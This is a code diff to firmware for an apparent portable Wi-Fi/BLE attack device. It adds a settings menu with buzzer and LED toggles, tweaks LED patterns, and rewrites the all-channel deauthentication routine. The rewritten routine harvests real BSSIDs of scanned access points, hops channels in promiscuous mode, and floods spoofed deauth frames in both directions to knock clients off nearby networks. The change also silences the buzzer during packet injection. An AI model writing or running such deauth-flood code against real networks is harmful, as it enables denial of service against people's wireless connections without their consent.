@@ -37,6 +37,7 @@ enum UiState {
   UI_TARGET_DETAILS,
   UI_ANALYZER,
   UI_SYSTEM_INFO,
+  UI_SYSTEM_SETTINGS,
   UI_LAB_PRECHECK,
   UI_TARGET_MONITOR,
   UI_LAB_STATS,
@@ -73,7 +74,7 @@ static const char *const MAIN_MENU_ITEMS[] = {
   "Sniffer",
   "BLE Tools",
   "IR Remote",
-  "System Info"
+  "System Settings"
 };
 
 static const char *const BLE_MENU_ITEMS[] = {
@@ -100,6 +101,7 @@ UiState uiState       = UI_MAIN_MENU;
 uint8_t mainMenuIndex = 0;
 uint8_t bleMenuIndex  = 0;
 uint8_t irMenuIndex   = 0;
+uint8_t systemSettingsIndex = 0;
 
 int     selectedNetwork = 0;
 int     listTop         = 0;
@@ -327,8 +329,8 @@ void setup() {
     uiDrawSplashProgress(percent, msg);
     uartPollCommand();
 
-    // 1. Turn ON exactly the assigned LED for the exact duration of the note
-    ledMelodySet(NOTES[i].led);
+    // 1. Turn ON LED in strict R→G→Y→R→G→Y cycle
+    ledStepRGY(i);
     playTone(NOTES[i].freq, NOTES[i].dur);
 
     // 2. Turn strictly OFF all LEDs during the rest period (Zero bleed!)
@@ -563,6 +565,13 @@ void handleNav() {
     return;
   }
 
+  if (uiState == UI_SYSTEM_SETTINGS) {
+    systemSettingsIndex = (systemSettingsIndex + 1) % 4;
+    uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
+    delay(150);
+    return;
+  }
+
   if (uiState == UI_BLE_MENU) {
     bleMenuIndex = nextIndex(bleMenuIndex, BLE_MENU_COUNT);
     drawBleMenu();
@@ -659,6 +668,32 @@ void handleOk() {
 
   if (uiState == UI_MAIN_MENU) { openMainMenuItem(); return; }
   if (uiState == UI_BLE_MENU)  { openBleMenuItem();  return; }
+
+  if (uiState == UI_SYSTEM_SETTINGS) {
+    if (systemSettingsIndex == 0) {
+      g_buzzerEnabled = !g_buzzerEnabled;
+      if (g_buzzerEnabled) buzzerClick();
+      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
+    } else if (systemSettingsIndex == 1) {
+      g_ledEnabled = !g_ledEnabled;
+      if (!g_ledEnabled) {
+        ledAllOff();
+      } else {
+        ledFlashGreen(1, 100);
+      }
+      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
+    } else if (systemSettingsIndex == 2) {
+      uiState = UI_SYSTEM_INFO;
+      uint8_t c24 = wifiScannerCountBand(2);
+      uint8_t c5  = wifiScannerCountBand(5);
+      uint8_t tot = wifiScannerCount();
+      uiDrawSystemInfo(targetHasSelection(), tot, c24, c5);
+    } else {
+      drawMainMenu();
+    }
+    delay(200);
+    return;
+  }
 
   if (uiState == UI_IR_MENU) {
     uiDrawStatus("Transmitting...");
@@ -861,7 +896,8 @@ void handleBack() {
   if (uiState == UI_RADAR_BAND_MENU)  { drawMainMenu(); return; }
   if (uiState == UI_RADAR_NETWORK_LIST) { drawMainMenu(); return; }
   if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) { drawMainMenu(); return; }
-  if (uiState == UI_SYSTEM_INFO)      { drawMainMenu(); return; }
+  if (uiState == UI_SYSTEM_SETTINGS)  { drawMainMenu(); return; }
+  if (uiState == UI_SYSTEM_INFO)      { uiState = UI_SYSTEM_SETTINGS; uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled); return; }
   if (uiState == UI_BLE_DETAILS)      { uiState = UI_BLE_LIST; uiDrawBleList(selectedBleDevice, bleListTop); return; }
   if (uiState == UI_BLE_LIST)         { closeBleScanList(); return; }
   if (uiState == UI_BLE_ANALYZER)     { closeBleAnalyzer(); return; }
@@ -971,12 +1007,10 @@ void openMainMenuItem() {
       uiDrawIrMenu(irMenuIndex);
       break;
     case 8: {
-      // System Info
-      uiState = UI_SYSTEM_INFO;
-      uint8_t c24 = wifiScannerCountBand(2);
-      uint8_t c5  = wifiScannerCountBand(5);
-      uint8_t tot = wifiScannerCount();
-      uiDrawSystemInfo(targetHasSelection(), tot, c24, c5);
+      // System Settings
+      uiState = UI_SYSTEM_SETTINGS;
+      systemSettingsIndex = 0;
+      uiDrawSystemSettings(systemSettingsIndex, g_buzzerEnabled, g_ledEnabled);
       break;
     }
   }
@@ -1124,7 +1158,6 @@ bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
   uint32_t lastPpsCalc = millis();
   uint32_t lastSentForPps = 0;
   uint16_t currentPps = 0;
-  uint32_t lastBuzzer = 0;
 
   uint8_t dstMacBuf[6];
   memcpy(dstMacBuf, dstMac, 6);
@@ -1186,11 +1219,6 @@ bool runPacketInjectionLabTargeted(const uint8_t *dstMac) {
       uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
     }
 
-    if (sentCount - lastBuzzer >= 30) {
-      lastBuzzer = sentCount;
-      buzzerClick();
-    }
-
     delay(20);
     yield();
   }
@@ -1243,7 +1271,6 @@ bool runPacketInjectionLab() {
   uint32_t lastPpsCalc = millis();
   uint32_t lastSentForPps = 0;
   uint16_t currentPps = 0;
-  uint32_t lastBuzzer = 0;
 
   txProbeReset();
 
@@ -1292,11 +1319,6 @@ bool runPacketInjectionLab() {
       uartSendLiveStats(target.channel, sentCount, failCount, currentPps);
     }
 
-    if (sentCount - lastBuzzer >= 30) {
-      lastBuzzer = sentCount;
-      buzzerClick();
-    }
-
     delay(20);
     yield();
   }
@@ -1312,15 +1334,23 @@ bool runDeauthAllChannels(uint8_t band) {
   uiDrawGenericMessage("ALL-CH ATTACK", band == 5 ? "5GHz All Channels" : "2.4GHz All Channels", "Activating Mode...");
   ledFlashGreen(1, 100);
 
+  // Pre-parse all scanned AP BSSIDs into binary MAC arrays
+  uint8_t totalAPs = wifiScannerCount();
+  uint8_t apMacs[MAX_NETWORKS][6];
+  uint8_t apChs[MAX_NETWORKS];
+  for (uint8_t i = 0; i < totalAPs && i < MAX_NETWORKS; i++) {
+    const NetworkInfo &n = wifiScannerNetwork(i);
+    parseMacAddress(n.bssid, apMacs[i]);
+    apChs[i] = n.channel;
+  }
+
   wifi_off();
   delay(150);
   wifi_on(RTW_MODE_STA);
   delay(150);
   wifi_change_channel_plan(0x7F);
   delay(100);
-
-  // Enable Promiscuous Mode to bypass MAC filtering
-  wifi_set_promisc(3, NULL, 0); // 3 = RTW_PROMISC_ENABLE_2
+  wifi_set_promisc(3, NULL, 0);
 
   bool anySent = false;
   uint32_t sentCount = 0;
@@ -1330,7 +1360,6 @@ bool runDeauthAllChannels(uint8_t band) {
   uint32_t lastSentForPps = 0;
   uint16_t currentPps = 0;
   uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
-  uint8_t fakeApMac[6]    = { 0x02, 0x11, 0x22, 0x33, 0x44, 0x55 };
 
   uiDrawDeauthScreen(band == 5 ? "ALL 5G CHANNELS" : "ALL 2.4G CHANNELS", chList[0], band == 5, 0);
 
@@ -1348,25 +1377,39 @@ bool runDeauthAllChannels(uint8_t band) {
 
     uint8_t curCh = chList[chIndex];
     wifi_set_channel(curCh);
-    delay(20);
+    delay(15);
 
-    // Burst on current channel
-    for (uint8_t burst = 0; burst < 10; burst++) {
-      if (attackStopRequested()) return stopPacketInjectionLab(anySent, sentCount);
+    // Send deauth using REAL BSSIDs of scanned APs on this channel
+    bool foundAP = false;
+    for (uint8_t ap = 0; ap < totalAPs && ap < MAX_NETWORKS; ap++) {
+      if (apChs[ap] != curCh) continue;
+      foundAP = true;
 
-      bool sent = wifi_tx_deauth_frame(fakeApMac, broadcastMac, fakeApMac, LAB_DEAUTH_REASON);
-      if (sent) {
-        anySent = true;
-        sentCount++;
-      } else {
-        failCount++;
-        delay(15);
+      for (uint8_t burst = 0; burst < 5; burst++) {
+        if (attackStopRequested()) return stopPacketInjectionLab(anySent, sentCount);
+
+        // AP -> Broadcast deauth (spoof AP kicking all clients)
+        bool s1 = wifi_tx_deauth_frame(apMacs[ap], broadcastMac, apMacs[ap], LAB_DEAUTH_REASON);
+        if (s1) { anySent = true; sentCount++; } else { failCount++; }
+        delay(3);
+
+        // Broadcast -> AP deauth (spoof client disconnecting from AP)
+        bool s2 = wifi_tx_deauth_frame(broadcastMac, apMacs[ap], apMacs[ap], LAB_DEAUTH_REASON);
+        if (s2) { sentCount++; } else { failCount++; }
+        delay(3);
       }
-      delay(10);
     }
 
-    // DMA flush yield
-    delay(50);
+    // Fallback: no scanned APs on this channel
+    if (!foundAP) {
+      for (uint8_t b = 0; b < 3; b++) {
+        wifi_tx_deauth_frame(broadcastMac, broadcastMac, broadcastMac, LAB_DEAUTH_REASON);
+        sentCount++;
+        delay(5);
+      }
+    }
+
+    delay(30);
 
     if (millis() - lastPpsCalc >= 1000) {
       currentPps = (uint16_t)(sentCount - lastSentForPps);
@@ -1376,7 +1419,6 @@ bool runDeauthAllChannels(uint8_t band) {
 
     if (millis() - lastUiUpdate > 80) {
       lastUiUpdate = millis();
-      // Pass curCh so live active hopping channel (36, 40, 44, etc.) is visible on OLED and Master
       uiRefreshDeauthLive(curCh, sentCount, failCount, currentPps, true, band == 5 ? "ALL 5G" : "ALL 2.4G");
       uartSendLiveStats(curCh, sentCount, failCount, currentPps);
     }
@@ -1609,7 +1651,7 @@ void runScan() {
 
     // Play next note of the scan melody synchronized with LEDs
     if (noteIndex < noteCount) {
-      ledMelodySet(SCAN_MELODY[noteIndex].led);
+      ledStepRGY(noteIndex);
       playTone(SCAN_MELODY[noteIndex].freq, SCAN_MELODY[noteIndex].dur);
       ledMelodySet(0);
       if (SCAN_MELODY[noteIndex].pause > 0) {
